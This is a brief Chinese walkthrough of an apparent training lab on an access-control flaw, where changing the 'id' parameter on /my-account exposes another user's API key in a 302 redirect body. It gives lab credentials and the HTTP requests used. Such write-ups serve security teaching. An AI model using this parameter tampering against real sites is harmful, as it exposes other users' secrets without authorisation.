# 实验：由请求参数控制的用户 ID（重定向中存在数据泄露）

本实验包含一个访问控制漏洞，其中敏感信息在重定向响应的正文中泄露。

为了解决本实验，请获取用户 `carlos` 的 API 密钥并将其作为解决方案提交。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 登录后访问用户页面
    ```http
    GET /my-account?id=wiener HTTP/2
    Cookie: session=Iz2tjWvF9R7O56tcfgY51sjxqIg5YSv4
    ```

- 访问账户页面时尝试移除会话 cookie 
    - 服务器返回 302 重定向，然而响应体中包含了账户页面。存在泄露

- 尝试访问目标用户的账户页面
    ```http
    GET /my-account?id=carlos HTTP/2
    ```
    - 从响应体中获取其 API 密钥
